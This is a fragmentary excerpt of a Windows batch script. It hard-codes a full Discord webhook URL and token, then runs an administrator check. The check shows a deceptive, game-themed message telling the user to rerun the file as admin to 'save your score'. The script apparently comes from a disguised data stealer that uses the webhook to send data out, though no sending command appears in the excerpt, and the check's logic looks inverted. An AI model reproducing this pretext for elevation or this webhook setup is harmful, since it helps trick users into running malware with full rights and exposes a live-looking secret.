...
set webhook=https://discord.com/api/webhooks/952536375671001148/Lug-cJ9vb_6GmQnM1GyphO1ipwLHPg5G8jgJT-ducjFMvaRQis3Dv3wrm0hl5TBFmEFj
...
:check_Permissions
    ...
    if %errorLevel% == 0 (
       ...
       cls
       echo Failure: Please run the file again with Admin to Save your Score to the TEMP directory! (open CMD with admin and run the file from the console!)
       timeout 2 >NUL
